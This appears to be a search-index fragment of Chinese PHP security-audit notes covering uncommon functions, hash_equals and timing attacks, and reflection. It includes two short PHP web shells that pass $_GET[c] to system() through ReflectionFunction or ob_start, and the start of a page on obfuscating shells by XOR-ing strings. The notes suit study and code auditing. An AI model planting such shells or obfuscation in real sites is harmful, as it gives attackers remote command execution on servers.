\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u88ab\u521b\u5efa \u4e3e\u4f8b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php if ( touch ( $filename )) { echo $filename . ' modification time has been changed to present time' ; } else { echo 'Sorry, could not change modification time of ' . $filename ; } // This is the touch time, we'll set it to one hour in the past. $time = time () - 3600 ; // Touch the file if ( ! touch ( 'some_file.txt' , $time )) { echo 'Whoops, something went wrong...' ; } else { echo 'Touched file with success' ; } ?> func_num_args \u00b6 Returns the number of arguments passed to the function \u6817\u5b50\uff1a 1 <?php function foo (){ $numargs = func_num_args (); echo \"Number of arguments: $numargs\\n \" ;} foo ( 1 , 2 , 3 ); ?> \u4ee5\u4e0a\u4f8b\u7a0b\u4f1a\u8f93\u51fa\uff1a 1 Number of arguments: 3 hash_equals \u00b6 \u53ef\u9632\u6b62\u65f6\u5e8f\u653b\u51fb\u7684\u5b57\u7b26\u4e32\u6bd4\u8f83 note \u8981\u60f3\u6210\u529f\u8fdb\u884c\u6bd4\u8f83\uff0c\u90a3\u4e48\u6240\u63d0\u4f9b\u7684 2 \u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u76f8\u540c\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u6240\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u4e0d\u540c\uff0c\u90a3\u4e48\u672c\u51fd\u6570\u4f1a\u7acb\u5373\u8fd4\u56de FALSE \uff0c \u5728\u65f6\u5e8f\u653b\u51fb\u7684\u573a\u666f\u4e0b\uff0c\u5df2\u77e5\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u53ef\u80fd\u4f1a\u88ab\u6cc4\u9732\u3002 \u6ce8\u610f \u975e\u5e38\u91cd\u8981\u7684\u4e00\u70b9\u662f\uff0c\u7528\u6237\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u5fc5\u987b\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002 \u53ef\u4ee5\u770b\u4f5c\u662fhash_equals\u7684\u5b9e\u73b0 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php if ( ! function_exists ( 'hash_equals' )) { function hash_equals ( $str1 , $str2 ) { if ( strlen ( $str1 ) != strlen ( $str2 )) { return false ; } else { $res = $str1 ^ $str2 ; $ret = 0 ; for ( $i = strlen ( $res ) - 1 ; $i >= 0 ; $i -- ) $ret |= ord ( $res [ $i ]); //\u8fd9\u91cc\u7528 | \u5f88\u68d2 return ! $ret ; } } } ?> \u5173\u4e8e timing attack? \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 <?php $time_start = microtime ( true ); $expected = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $correct = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $result = hash_equals ( $expected , $correct ); $time_end = microtime ( true ); echo $time_end - $time_start ; ?> or <?php $time_start = microtime ( true ); $expected = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $correct = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $result = $expected == $correct ; $time_end = microtime ( true ); echo $time_end - $time_start ; ?> exec\u51fd\u6570 \u00b6 exec\u53ef\u4ee5\u6267\u884c\u5916\u90e8\u547d\u4ee4 \u53c2\u8003 \u00b6 https://stackoverflow.com/questions/2409237/how-to-call-the-constructor-with-call-user-func-array-in-php","title":"php\u4e0d\u5e38\u7528\u51fd\u6570"},{"location":"web_sec/audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#php","text":"","title":"php\u4e0d\u5e38\u7528\u51fd\u6570"},{"location":"web_sec/audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#call_user_func_array","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 <?php function foobar ( $arg , $arg2 ) { echo __FUNCTION__ , \" got $arg and $arg2\\n \" ; } class foo { function bar ( $arg , $arg2 ) { echo __METHOD__ , \" got $arg and $arg2\\n \" ; } } // Call the foobar() function with 2 arguments call_user_func_array ( \"foobar\" , array ( \"one\" , \"two\" )); // Call the $foo->bar() method with 2 arguments $foo = new foo ; call_user_func_array ( array ( $foo , \"bar\" ), array ( \"three\" , \"four\" )); ?> \u4f7f\u7528\u547d\u540d\u7a7a\u95f4\u7684\u60c5\u51b5\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php namespace Foobar ; class Foo { static public function test ( $name ) { print \"Hello { $name } ! \\n \" ; } } // As of PHP 5.3.0 call_user_func_array ( __NAMESPACE__ . '\\Foo::test' , array ( 'Hannes' )); // As of PHP 5.3.0 call_user_func_array ( array ( __NAMESPACE__ . '\\Foo' , 'test' ), array ( 'Philip' )); ?> How could I call the constructor of a class with call_user_func_array \u4e0b\u9762\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u53ef\u80fd\uff1a 1 2 $obj = new $class(); call_user_func_array(array($obj, '__construct'), $args); You can use reflection like: 1 2 $reflect = new ReflectionClass($class); $instance = $reflect->newInstanceArgs($args); As of PHP 5.6.0, the ... operator can also be used for this purpose. 1 2 3 4 5 6 if(version_compare(PHP_VERSION, '5.6.0', '>=')){ $instance = new $class(...$args); } else { $reflect = new ReflectionClass($class); $instance = $reflect->newInstanceArgs($args); }","title":"call_user_func_array"},{"location":"web_sec/audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#is_file-or-file_exists","text":"is_file() will return false if the given path points to a directory. file_exists() will return true if the given path points to a valid file or directory. So it would depend entirely on your needs. If you want to know specifically if it's a file or not, use is_file() . Otherwise, use file_exists() . is_file \u4e0d\u4f1a\u89e3\u6790\u76ee\u5f55\uff0c\u4e5f\u4e0d\u4f1a\u89e3\u6790\u7b26\u53f7\u94fe\u63a5","title":"is_file or file_exists"},{"location":"web_sec/audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#file_put_contents","text":"\u4f1a\u8986\u76d6\u6587\u4ef6\u4e4b\u524d\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u4e0d\u4f1a\u521b\u5efa\u76ee\u5f55 1 2 $month = date('Yd') file_put_contents(\"upload/promotions/\".$month.\"/\".$image, $contents_data); //\u62a5\u9519\uff01\uff01No such file or directory \u89e3\u51b3\uff1a 1 2 3 4 5 6 if (!is_dir('upload/promotions/' . $month)) { // dir doesn't exist, make it mkdir('upload/promotions/' . $month); } file_put_contents('upload/promotions/' . $month . '/' . $image, $contents_data);","title":"file_put_contents"},{"location":"web_sec/audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#glob","text":"\u5bfb\u627e\u4e0e\u6a21\u5f0f\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84 \u4e3e\u4f8b 1 2 3 4 5 <?php foreach ( glob ( \"*.txt\" ) as $filename ) { echo \" $filename size \" . filesize ( $filename ) . \" \\n \" ; } ?> \u7528 glob \u51fd\u6570\u66ff\u4ee3 opendir","title":"glob"},{"location":"web_sec/audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#touch","text":"\u8bbe\u5b9a\u6587\u4ef6\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u65f6\u95f4 touch ( string filename [, int filename<code>[, int</code> time = time() [, int $atime ]] ) : bool \u5c1d\u8bd5\u5c06\u7531 filename \u7ed9\u51fa\u7684\u6587\u4ef6\u7684\u8bbf\u95ee\u548c\u4fee\u6539\u65f6\u95f4\u8bbe\u5b9a\u4e3a\u7ed9\u51fa\u7684 time \u3002 \u6ce8\u610f\u8bbf\u95ee\u65f6\u95f4\u603b\u662f\u4f1a\u88ab\u4fee\u6539\u7684\uff0c\u4e0d\u8bba\u6709\u51e0\u4e2a\u53c2\u6570\u3002 \u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u88ab\u521b\u5efa \u4e3e\u4f8b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php if ( touch ( $filename )) { echo $filename . ' modification time has been changed to present time' ; } else { echo 'Sorry, could not change modification time of ' . $filename ; } // This is the touch time, we'll set it to one hour in the past. $time = time () - 3600 ; // Touch the file if ( ! touch ( 'some_file.txt' , $time )) { echo 'Whoops, something went wrong...' ; } else { echo 'Touched file with success' ; } ?>","title":"touch"},{"location":"web_sec/audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#func_num_args","text":"Returns the number of arguments passed to the function \u6817\u5b50\uff1a 1 <?php function foo (){ $numargs = func_num_args (); echo \"Number of arguments: $numargs\\n \" ;} foo ( 1 , 2 , 3 ); ?> \u4ee5\u4e0a\u4f8b\u7a0b\u4f1a\u8f93\u51fa\uff1a 1 Number of arguments: 3","title":"func_num_args"},{"location":"web_sec/audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#hash_equals","text":"\u53ef\u9632\u6b62\u65f6\u5e8f\u653b\u51fb\u7684\u5b57\u7b26\u4e32\u6bd4\u8f83 note \u8981\u60f3\u6210\u529f\u8fdb\u884c\u6bd4\u8f83\uff0c\u90a3\u4e48\u6240\u63d0\u4f9b\u7684 2 \u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u76f8\u540c\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u6240\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u4e0d\u540c\uff0c\u90a3\u4e48\u672c\u51fd\u6570\u4f1a\u7acb\u5373\u8fd4\u56de FALSE \uff0c \u5728\u65f6\u5e8f\u653b\u51fb\u7684\u573a\u666f\u4e0b\uff0c\u5df2\u77e5\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u53ef\u80fd\u4f1a\u88ab\u6cc4\u9732\u3002 \u6ce8\u610f \u975e\u5e38\u91cd\u8981\u7684\u4e00\u70b9\u662f\uff0c\u7528\u6237\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\u5fc5\u987b\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002","title":"hash_equals"},{"location":"web_sec/audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#hash_equals_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php if ( ! function_exists ( 'hash_equals' )) { function hash_equals ( $str1 , $str2 ) { if ( strlen ( $str1 ) != strlen ( $str2 )) { return false ; } else { $res = $str1 ^ $str2 ; $ret = 0 ; for ( $i = strlen ( $res ) - 1 ; $i >= 0 ; $i -- ) $ret |= ord ( $res [ $i ]); //\u8fd9\u91cc\u7528 | \u5f88\u68d2 return ! $ret ; } } } ?>","title":"\u53ef\u4ee5\u770b\u4f5c\u662fhash_equals\u7684\u5b9e\u73b0"},{"location":"web_sec/audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#timing-attack","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 <?php $time_start = microtime ( true ); $expected = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $correct = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $result = hash_equals ( $expected , $correct ); $time_end = microtime ( true ); echo $time_end - $time_start ; ?> or <?php $time_start = microtime ( true ); $expected = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $correct = crypt ( '12345' , '$2a$07$usesomesillystringforsalt$' ); $result = $expected == $correct ; $time_end = microtime ( true ); echo $time_end - $time_start ; ?>","title":"\u5173\u4e8e timing attack?"},{"location":"web_sec/audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#exec","text":"exec\u53ef\u4ee5\u6267\u884c\u5916\u90e8\u547d\u4ee4","title":"exec\u51fd\u6570"},{"location":"web_sec/audit/php\u4e0d\u5e38\u89c1\u7684\u51fd\u6570/#_1","text":"https://stackoverflow.com/questions/2409237/how-to-call-the-constructor-with-call-user-func-array-in-php","title":"\u53c2\u8003"},{"location":"web_sec/audit/php\u53cd\u5c04/","text":"php\u53cd\u5c04 \u00b6 \u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u4e2d\u5bf9\u8c61\u88ab\u8d4b\u4e88\u4e86\u81ea\u7701\u7684\u80fd\u529b\uff0c\u800c\u8fd9\u4e2a\u81ea\u7701\u7684\u8fc7\u7a0b\u5c31\u662f\u53cd\u5c04\u3002 \u53cd\u5c04\uff0c\u76f4\u89c2\u7406\u89e3\u5c31\u662f\u6839\u636e\u5230\u8fbe\u5730\u627e\u5230\u51fa\u53d1\u5730\u548c\u6765\u6e90\u3002\u6bd4\u5982\uff0c\u4e00\u4e2a\u5149\u79c3\u79c3\u7684\u5bf9\u8c61\uff0c\u6211\u4eec\u53ef\u4ee5\u4ec5\u4ec5\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u5c31\u80fd\u77e5\u9053\u5b83\u6240\u5c5e\u7684\u7c7b\u3001\u62e5\u6709\u54ea\u4e9b\u65b9\u6cd5\u3002 \u53cd\u5c04\u662f\u6307\u5728PHP\u8fd0\u884c\u72b6\u6001\u4e2d\uff0c\u6269\u5c55\u5206\u6790PHP\u7a0b\u5e8f\uff0c\u5bfc\u51fa\u6216\u63d0\u51fa\u5173\u4e8e\u7c7b\u3001\u65b9\u6cd5\u3001\u5c5e\u6027\u3001\u53c2\u6570\u7b49\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u6ce8\u91ca\u3002\u8fd9\u79cd\u52a8\u6001\u83b7\u53d6\u4fe1\u606f\u4ee5\u53ca\u52a8\u6001\u8c03\u7528\u5bf9\u8c61\u65b9\u6cd5\u7684\u529f\u80fd\u79f0\u4e3a\u53cd\u5c04API\u3002 \u5982\u4f55\u4f7f\u7528\u53cd\u5c04API 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 <?php class person { public $name ; public $gender ; public function say (){ echo $this -> name , \" \\t is \" , $this -> gender , \" \\r\\n \" ; } public function set ( $name , $value ) { echo \"Setting $name to $value \\r\\n \" ; $this -> $name = $value ; } public function get ( $name ) { if ( ! isset ( $this -> $name )){ echo '\u672a\u8bbe\u7f6e' ; \u3000\u3000 $this -> $name = \"\u6b63\u5728\u4e3a\u4f60\u8bbe\u7f6e\u9ed8\u8ba4\u503c\" ; } return $this -> $name ; } } $student = new person (); $student -> name = 'Tom' ; $student -> gender = 'male' ; $student -> age = 24 ; \u73b0\u5728\uff0c\u8981\u83b7\u53d6\u8fd9\u4e2astudent\u5bf9\u8c61\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\u5217\u8868\u8be5\u600e\u4e48\u505a\u5462\uff1f\u5982\u4ee5\u4e0b\u4ee3\u7801\u6240\u793a\uff1a 1 2 3 4 5 6 7 8 9 10 11 // \u83b7\u53d6\u5bf9\u8c61\u5c5e\u6027\u5217\u8868 $reflect = new ReflectionObject($student); $props\u3000= $reflect->getProperties(); foreach ($props as $prop) { print $prop->getName() .\"\\n\"; } // \u83b7\u53d6\u5bf9\u8c61\u65b9\u6cd5\u5217\u8868 $m=$reflect->getMethods(); foreach ($m as $prop) { print $prop->getName() .\"\\n\"; } \u4e5f\u53ef\u4ee5\u4e0d\u7528\u53cd\u5c04API\uff0c\u4f7f\u7528class\u51fd\u6570\uff0c\u8fd4\u56de\u5bf9\u8c61\u5c5e\u6027\u7684\u5173\u8054\u6570\u7ec4\u4ee5\u53ca\u66f4\u591a\u7684\u4fe1\u606f\uff1a 1 2 3 4 5 6 // \u8fd4\u56de\u5bf9\u8c61\u5c5e\u6027\u7684\u5173\u8054\u6570\u7ec4 var_dump(get_object_vars($student)); // \u7c7b\u5c5e\u6027 var_dump(get_class_vars(get_class($student))); // \u8fd4\u56de\u7531\u7c7b\u7684\u65b9\u6cd5\u540d\u7ec4\u6210\u7684\u6570\u7ec4 var_dump(get_class_methods(get_class($student))); \u5047\u5982\u8fd9\u4e2a\u5bf9\u8c61\u662f\u4ece\u5176\u4ed6\u9875\u9762\u4f20\u8fc7\u6765\u7684\uff0c\u600e\u4e48\u77e5\u9053\u5b83\u5c5e\u4e8e\u54ea\u4e2a\u7c7b\u5462\uff1f\u4e00\u53e5\u4ee3\u7801\u5c31\u53ef\u4ee5\u641e\u5b9a\uff1a 1 2 // \u83b7\u53d6\u5bf9\u8c61\u5c5e\u6027\u5217\u8868\u6240\u5c5e\u7684\u7c7b echo get_class($student); \u53cd\u5c04API\u7684\u529f\u80fd\u663e\u7136\u66f4\u5f3a\u5927\uff0c\u751a\u81f3\u80fd\u8fd8\u539f\u8fd9\u4e2a\u7c7b\u7684\u539f\u578b\uff0c\u5305\u62ec\u65b9\u6cd5\u7684\u8bbf\u95ee\u6743\u9650\u7b49\uff0c\u5982\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // \u53cd\u5c04\u83b7\u53d6\u7c7b\u7684\u539f\u578b $obj = new ReflectionClass('person'); $className = $obj->getName(); $Methods = $Properties = array(); foreach($obj->getProperties() as $v) { \u3000\u3000\u3000\u3000$Properties\uff3b$v->getName()\uff3d = $v; } foreach($obj->getMethods() as $v) \u3000\u3000 { \u3000\u3000\u3000\u3000$Methods\uff3b$v->getName()\uff3d = $v; } echo \"class {$className}\\n{\\n\"; is_array($Properties)&&ksort($Properties); foreach($Properties as $k => $v) { \u3000\u3000\u3000\u3000echo \"\\t\"; \u3000\u3000\u3000\u3000echo $v->isPublic() ? ' public' : '',$v->isPrivate() ? ' private' : '', \u3000\u3000\u3000\u3000$v->isProtected() ? ' protected' : '', \u3000\u3000\u3000\u3000$v->isStatic() ? ' static' : ''; \u3000\u3000\u3000\u3000echo \"\\t{$k}\\n\"; } echo \"\\n\"; if(is_array($Methods)) ksort($Methods); foreach($Methods as $k => $v) { \u3000\u3000\u3000\u3000echo \"\\tfunction {$k}(){}\\n\"; } echo \"}\\n\"; \u8f93\u51fa\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 class person { public\u3000gender public\u3000name function get(){} function set(){} function say(){} } \u52a8\u6001\u4ee3\u7406\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 <?php class mysql { function connect ( $db ) { echo \"\u8fde\u63a5\u5230\u6570\u636e\u5e93 ${ db\uff3b0\uff3d } \\r\\n \" ; } } class sqlproxy { private $target ; function construct ( $tar ) { $this -> target\uff3b\uff3d = new $tar (); } function call ( $name , $args ) { foreach ( $this -> target as $obj ) { $r = new ReflectionClass ( $obj ); if ( $method = $r -> getMethod ( $name )) { if ( $method -> isPublic () && ! $method -> isAbstract ()) { echo \"\u65b9\u6cd5\u524d\u62e6\u622a\u8bb0\u5f55LOG \\r\\n \" ; $method -> invoke ( $obj , $args ); echo \"\u65b9\u6cd5\u540e\u62e6\u622a \\r\\n \" ; } } } } } $obj = new sqlproxy ( 'mysql' ); $obj -> connect ( 'member' ); ReflectionFunction\u7c7b \u00b6 1 2 3 4 5 6 7 8 9 10 <?php function title ( $title , $name ) { return sprintf ( \"%s. %s \\r\\n \" , $title , $name ); } $function = new ReflectionFunction ( 'title' ); echo $function -> invokeArgs ( array ( 'Dr' , 'Phil' )); //\u76f8\u5f53\u4e8e\u8c03\u7528\u4e86title\u51fd\u6570 ?> \u4e00\u4e2a\u7b80\u5355\u7684shell\uff1a 1 2 3 4 <?php $func = new ReflectionFunction ( \"system\" ); echo $func -> invokeArgs ( array ( \" $_GET[c] \" )); ?> ob_start\u51fd\u6570 \u00b6 1 2 3 4 5 6 <?php $cb = 'system' ; ob_start ( $cb ); echo $_GET [ c ]; ob_end_flush (); ?> \u53c2\u8003 \u00b6 https://security.tencent.com/index.php/blog/msg/58","title":"php\u53cd\u5c04"},{"location":"web_sec/audit/php\u53cd\u5c04/#php","text":"\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u4e2d\u5bf9\u8c61\u88ab\u8d4b\u4e88\u4e86\u81ea\u7701\u7684\u80fd\u529b\uff0c\u800c\u8fd9\u4e2a\u81ea\u7701\u7684\u8fc7\u7a0b\u5c31\u662f\u53cd\u5c04\u3002 \u53cd\u5c04\uff0c\u76f4\u89c2\u7406\u89e3\u5c31\u662f\u6839\u636e\u5230\u8fbe\u5730\u627e\u5230\u51fa\u53d1\u5730\u548c\u6765\u6e90\u3002\u6bd4\u5982\uff0c\u4e00\u4e2a\u5149\u79c3\u79c3\u7684\u5bf9\u8c61\uff0c\u6211\u4eec\u53ef\u4ee5\u4ec5\u4ec5\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u5c31\u80fd\u77e5\u9053\u5b83\u6240\u5c5e\u7684\u7c7b\u3001\u62e5\u6709\u54ea\u4e9b\u65b9\u6cd5\u3002 \u53cd\u5c04\u662f\u6307\u5728PHP\u8fd0\u884c\u72b6\u6001\u4e2d\uff0c\u6269\u5c55\u5206\u6790PHP\u7a0b\u5e8f\uff0c\u5bfc\u51fa\u6216\u63d0\u51fa\u5173\u4e8e\u7c7b\u3001\u65b9\u6cd5\u3001\u5c5e\u6027\u3001\u53c2\u6570\u7b49\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u6ce8\u91ca\u3002\u8fd9\u79cd\u52a8\u6001\u83b7\u53d6\u4fe1\u606f\u4ee5\u53ca\u52a8\u6001\u8c03\u7528\u5bf9\u8c61\u65b9\u6cd5\u7684\u529f\u80fd\u79f0\u4e3a\u53cd\u5c04API\u3002 \u5982\u4f55\u4f7f\u7528\u53cd\u5c04API 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 <?php class person { public $name ; public $gender ; public function say (){ echo $this -> name , \" \\t is \" , $this -> gender , \" \\r\\n \" ; } public function set ( $name , $value ) { echo \"Setting $name to $value \\r\\n \" ; $this -> $name = $value ; } public function get ( $name ) { if ( ! isset ( $this -> $name )){ echo '\u672a\u8bbe\u7f6e' ; \u3000\u3000 $this -> $name = \"\u6b63\u5728\u4e3a\u4f60\u8bbe\u7f6e\u9ed8\u8ba4\u503c\" ; } return $this -> $name ; } } $student = new person (); $student -> name = 'Tom' ; $student -> gender = 'male' ; $student -> age = 24 ; \u73b0\u5728\uff0c\u8981\u83b7\u53d6\u8fd9\u4e2astudent\u5bf9\u8c61\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\u5217\u8868\u8be5\u600e\u4e48\u505a\u5462\uff1f\u5982\u4ee5\u4e0b\u4ee3\u7801\u6240\u793a\uff1a 1 2 3 4 5 6 7 8 9 10 11 // \u83b7\u53d6\u5bf9\u8c61\u5c5e\u6027\u5217\u8868 $reflect = new ReflectionObject($student); $props\u3000= $reflect->getProperties(); foreach ($props as $prop) { print $prop->getName() .\"\\n\"; } // \u83b7\u53d6\u5bf9\u8c61\u65b9\u6cd5\u5217\u8868 $m=$reflect->getMethods(); foreach ($m as $prop) { print $prop->getName() .\"\\n\"; } \u4e5f\u53ef\u4ee5\u4e0d\u7528\u53cd\u5c04API\uff0c\u4f7f\u7528class\u51fd\u6570\uff0c\u8fd4\u56de\u5bf9\u8c61\u5c5e\u6027\u7684\u5173\u8054\u6570\u7ec4\u4ee5\u53ca\u66f4\u591a\u7684\u4fe1\u606f\uff1a 1 2 3 4 5 6 // \u8fd4\u56de\u5bf9\u8c61\u5c5e\u6027\u7684\u5173\u8054\u6570\u7ec4 var_dump(get_object_vars($student)); // \u7c7b\u5c5e\u6027 var_dump(get_class_vars(get_class($student))); // \u8fd4\u56de\u7531\u7c7b\u7684\u65b9\u6cd5\u540d\u7ec4\u6210\u7684\u6570\u7ec4 var_dump(get_class_methods(get_class($student))); \u5047\u5982\u8fd9\u4e2a\u5bf9\u8c61\u662f\u4ece\u5176\u4ed6\u9875\u9762\u4f20\u8fc7\u6765\u7684\uff0c\u600e\u4e48\u77e5\u9053\u5b83\u5c5e\u4e8e\u54ea\u4e2a\u7c7b\u5462\uff1f\u4e00\u53e5\u4ee3\u7801\u5c31\u53ef\u4ee5\u641e\u5b9a\uff1a 1 2 // \u83b7\u53d6\u5bf9\u8c61\u5c5e\u6027\u5217\u8868\u6240\u5c5e\u7684\u7c7b echo get_class($student); \u53cd\u5c04API\u7684\u529f\u80fd\u663e\u7136\u66f4\u5f3a\u5927\uff0c\u751a\u81f3\u80fd\u8fd8\u539f\u8fd9\u4e2a\u7c7b\u7684\u539f\u578b\uff0c\u5305\u62ec\u65b9\u6cd5\u7684\u8bbf\u95ee\u6743\u9650\u7b49\uff0c\u5982\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // \u53cd\u5c04\u83b7\u53d6\u7c7b\u7684\u539f\u578b $obj = new ReflectionClass('person'); $className = $obj->getName(); $Methods = $Properties = array(); foreach($obj->getProperties() as $v) { \u3000\u3000\u3000\u3000$Properties\uff3b$v->getName()\uff3d = $v; } foreach($obj->getMethods() as $v) \u3000\u3000 { \u3000\u3000\u3000\u3000$Methods\uff3b$v->getName()\uff3d = $v; } echo \"class {$className}\\n{\\n\"; is_array($Properties)&&ksort($Properties); foreach($Properties as $k => $v) { \u3000\u3000\u3000\u3000echo \"\\t\"; \u3000\u3000\u3000\u3000echo $v->isPublic() ? ' public' : '',$v->isPrivate() ? ' private' : '', \u3000\u3000\u3000\u3000$v->isProtected() ? ' protected' : '', \u3000\u3000\u3000\u3000$v->isStatic() ? ' static' : ''; \u3000\u3000\u3000\u3000echo \"\\t{$k}\\n\"; } echo \"\\n\"; if(is_array($Methods)) ksort($Methods); foreach($Methods as $k => $v) { \u3000\u3000\u3000\u3000echo \"\\tfunction {$k}(){}\\n\"; } echo \"}\\n\"; \u8f93\u51fa\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 class person { public\u3000gender public\u3000name function get(){} function set(){} function say(){} } \u52a8\u6001\u4ee3\u7406\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 <?php class mysql { function connect ( $db ) { echo \"\u8fde\u63a5\u5230\u6570\u636e\u5e93 ${ db\uff3b0\uff3d } \\r\\n \" ; } } class sqlproxy { private $target ; function construct ( $tar ) { $this -> target\uff3b\uff3d = new $tar (); } function call ( $name , $args ) { foreach ( $this -> target as $obj ) { $r = new ReflectionClass ( $obj ); if ( $method = $r -> getMethod ( $name )) { if ( $method -> isPublic () && ! $method -> isAbstract ()) { echo \"\u65b9\u6cd5\u524d\u62e6\u622a\u8bb0\u5f55LOG \\r\\n \" ; $method -> invoke ( $obj , $args ); echo \"\u65b9\u6cd5\u540e\u62e6\u622a \\r\\n \" ; } } } } } $obj = new sqlproxy ( 'mysql' ); $obj -> connect ( 'member' );","title":"php\u53cd\u5c04"},{"location":"web_sec/audit/php\u53cd\u5c04/#reflectionfunction","text":"1 2 3 4 5 6 7 8 9 10 <?php function title ( $title , $name ) { return sprintf ( \"%s. %s \\r\\n \" , $title , $name ); } $function = new ReflectionFunction ( 'title' ); echo $function -> invokeArgs ( array ( 'Dr' , 'Phil' )); //\u76f8\u5f53\u4e8e\u8c03\u7528\u4e86title\u51fd\u6570 ?> \u4e00\u4e2a\u7b80\u5355\u7684shell\uff1a 1 2 3 4 <?php $func = new ReflectionFunction ( \"system\" ); echo $func -> invokeArgs ( array ( \" $_GET[c] \" )); ?>","title":"ReflectionFunction\u7c7b"},{"location":"web_sec/audit/php\u53cd\u5c04/#ob_start","text":"1 2 3 4 5 6 <?php $cb = 'system' ; ob_start ( $cb ); echo $_GET [ c ]; ob_end_flush (); ?>","title":"ob_start\u51fd\u6570"},{"location":"web_sec/audit/php\u53cd\u5c04/#_1","text":"https://security.tencent.com/index.php/blog/msg/58","title":"\u53c2\u8003"},{"location":"web_sec/audit/webshell\u6784\u9020/","text":"Webshell\u6784\u9020 \u00b6 \u5f02\u6216\u65b9\u6cd5 \u00b6 1 2 3 4 php > $a = \"`{{{\"; php > $b = \"?<>/\"; php > var_dump($a^$b); string(4) \"_GET\" \u8fd9\u91cc\u4e5f\u6709\u4e00\u79cd\u7b80\u77ed\u7684\u5199\u6cd5 ${~\"\\xa0\\xb8\\xba\\xab\"} \u5b83\u7b49\u4e8e $_GET \u6570\u7ec4\u62fc\u63a5 \u00b6 'a'++ => 'b'\uff0c'b'++ => 'c'\uff0c\u6211\u4eec\u53ea\u8981\u80fd\u62ff\u5230\u4e00\u4e2a\u53d8\u91cf\uff0c\u5176\u503c\u4e3aa\uff0c\u901a\u8fc7\u81ea\u589e\u64cd\u4f5c\u5373\u53ef\u83b7\u5f97a-z\u4e2d\u6240\u6709\u5b57\u7b26\u3002 \u6570\u7ec4\uff08Array\uff09\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u5c31\u662f\u5927\u5199A\uff0c\u800c\u4e14\u7b2c4\u4e2a\u5b57\u6bcd\u662f\u5c0f\u5199a\u3002\u5728PHP\u4e2d\uff0c\u5982\u679c\u5f3a\u5236\u8fde\u63a5\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\u7684\u8bdd\uff0c\u6570\u7ec4\u5c06\u88ab\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\uff0c\u5176\u503c\u4e3aArray\u3002\u518d\u53d6\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97'A'\u3002 